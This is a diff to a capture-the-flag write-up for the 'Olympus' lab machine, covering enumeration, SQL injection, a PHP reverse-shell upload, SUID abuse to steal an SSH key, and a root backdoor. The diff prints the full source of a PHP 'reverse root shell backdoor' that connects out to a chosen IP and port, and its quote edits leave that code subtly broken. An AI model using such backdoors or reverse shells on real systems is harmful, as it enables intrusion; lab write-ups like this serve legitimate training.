@@ -20,13 +20,11 @@ Nmap done: 1 IP address (1 host up) scanned in 433.33 seconds")}}
 
 {{list(['22 (SSH)', '80 (HTTP)'])}}
 
-{{header()}}
-
 {{text("Let's visit the web page.")}}
 
 {{text("Before that, we have to add <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>olympus.thm</code> to our <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file.")}}
 
-{{image("../../static/writeups/ohmyweb/images/000001.jpg")}}
+{{image("../../static/writeups/olympus/images/000001.jpg")}}
 
 {{text("I used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>gobuster</code> to enumerate through hidden directories.")}}
 
@@ -60,7 +58,9 @@ Finished
 
 {{text("We find an interesting platform 'each and everyone of you to express their needs and desires' at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://olympus.thm/~webmaster/</code>")}}
 
-{{image("../../static/writeups/ohmyweb/images/000002.jpg")}}
+{{image("../../static/writeups/olympus/images/000002.jpg")}}
+
+{{header("Web page", "web-page")}}
 
 {{text("What looked interesting to me was the search form at the bottom of the page. I used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Burp</code> to catch a request of it and saved it into a file.")}}
 
@@ -130,7 +130,9 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 
 {{text("We can use his e-mail and password to log into the site.")}}
 
-{{image("../../static/writeups/ohmyweb/images/000003.jpg")}}
+{{image("../../static/writeups/olympus/images/000003.jpg")}}
+
+{{header("Shell as www-data", "shell-as-www-data")}}
 
 {{text("I have tried enumerating this page, but couldn't find anything interesting.")}}
 
@@ -140,7 +142,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 
 {{text("After getting back a login form, I entered the same user's username (not the e-mail) and password as the last page and logged in.")}}
 
-{{image("../../static/writeups/ohmyweb/images/000004.jpg")}}
+{{image("../../static/writeups/olympus/images/000004.jpg")}}
 
 {{text("I tried looking for the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>prometheus_password.txt</code> file, I found a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://chat.olympus.thm/uploads</code> page but couldn't find that file.")}}
 
@@ -174,13 +176,13 @@ Table: chats
 
 {{text("Sadly, it wasn't enough.")}}
 
-{{image("../../static/writeups/ohmyweb/images/000004.jpg")}}
+{{image("../../static/writeups/olympus/images/000005.jpg")}}
 
 {{text("I proceeded to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code> and copied a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>PHP PentestMonkey</code> reverse shell into a file.")}}
 
 {{text("I then tried uploading it through the chat.")}}
 
-{{image("../../static/writeups/ohmyweb/images/000005.jpg")}}
+{{image("../../static/writeups/olympus/images/000006.jpg")}}
 
 {{text("After it successfully uploaded, I once again dumped the contents of the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>chats</code> table and used the file name that was generated for my file.")}}
 
@@ -188,9 +190,9 @@ Table: chats
 
 {{text("After setting up a listener and going to the correct URL, I got a connection.")}}
 
-{{image("../../static/writeups/ohmyweb/images/000005.jpg")}}
+{{image("../../static/writeups/olympus/images/000007.jpg")}}
 
-{{header()}}
+{{header("Shell as zeus", "shell-as-zeus")}}
 
 {{text("While enumerating my user, I found an interesting file with SUID bit set.")}}
 
@@ -207,7 +209,7 @@ Table: chats
 
 {{text("I simply used it to copy user's <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>zeus</code> private key.")}}
 
-{{image("../../static/writeups/ohmyweb/images/000005.jpg")}}
+{{image("../../static/writeups/olympus/images/000008.jpg")}}
 
 {{text("After copying the key to my computer and trying to log in as <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>zeus</code> I got prompted for a passphrase to the key.")}}
 
@@ -215,7 +217,7 @@ Table: chats
 
 {{text("After a while, I got the passphrase and used it to log in.")}}
 
-{{header}}
+{{header("Shell as root", "shell-as-root")}}
 
 {{text("For a long time I couldn't find anything interesting, even while using <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>linpeas</code>.")}}
 
@@ -223,30 +225,30 @@ Table: chats
 
 {{console("cat VIGQFQFMYOST.php", "<?php
 $pass = 'a7c5ffcf139742f52a5267c4a0674129';
-if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');
+if(!isset($_POST['password']) || $_POST['password'] != $pass) die('<form name='auth' method='POST'>Password: <input type='password' name='password' /></form>');
 
 set_time_limit(0);
 
-$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
-if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
-$ip = $_GET["ip"]; $port = $_GET["port"];
+$host = htmlspecialchars('$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]', ENT_QUOTES, 'UTF-8');
+if(!isset($_GET['ip']) || !isset($_GET['port'])) die('<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]');
+$ip = $_GET['ip']; $port = $_GET['port'];
 
 $write_a = null;
 $error_a = null;
 
-$suid_bd = "/lib/defended/libc.so.99";
-$shell = "uname -a; w; $suid_bd";
+$suid_bd = '/lib/defended/libc.so.99';
+$shell = 'uname -a; w; $suid_bd';
 
-chdir("/"); umask(0);
+chdir('/'); umask(0);
 $sock = fsockopen($ip, $port, $errno, $errstr, 30);
-if(!$sock) die("couldn't open socket");
+if(!$sock) die('couldn\'t open socket');
 
-$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
+$fdspec = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
 $proc = proc_open($shell, $fdspec, $pipes);
 
 if(!is_resource($proc)) die();
 
-for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
+for($x=0;$x<=2;$x++) stream_set_blocking($pipes[$x], 0);
 stream_set_blocking($sock, 0);
 
 while(1)
@@ -260,18 +262,20 @@ while(1)
 }
 
 fclose($sock);
-for($x=0;$x<=2;$x++) fclose($pipes[x]);
+for($x=0;$x<=2;$x++) fclose($pipes[$x]);
 proc_close($proc);
 ?>")}}
 
 {{text("I went to this file in my browser and it asked me for a password.")}}
 
-{{image("../../static/writeups/ohmyweb/images/000006.jpg")}}
+{{image("../../static/writeups/olympus/images/000009.jpg")}}
 
 {{text("I entered the password from the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>$pass</code> variable and it worked.")}}
 
-{{image("../../static/writeups/ohmyweb/images/000007.jpg")}}
+{{image("../../static/writeups/olympus/images/000010.jpg")}}
 
 {{text("I used the remote method and was able to become root.")}}
 
-{{image("../../static/writeups/ohmyweb/images/000008.jpg")}}
+{{image("../../static/writeups/olympus/images/000011.jpg")}}
+
+{{script()}}
